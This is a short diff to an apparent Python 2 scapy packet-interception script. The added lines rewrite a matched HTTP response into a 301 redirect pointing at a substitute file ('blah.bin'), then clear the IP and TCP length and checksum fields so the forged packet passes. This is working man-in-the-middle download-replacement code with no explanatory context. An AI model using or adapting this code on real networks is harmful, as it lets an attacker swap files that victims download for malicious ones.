@@ -17,7 +17,11 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print "[+] Replacing file"
-                print scapy_packet.show()
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1/blah.bin"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].len
+                del scapy_packet[scapy.TCP].chksum
 
 
     packet.accept()
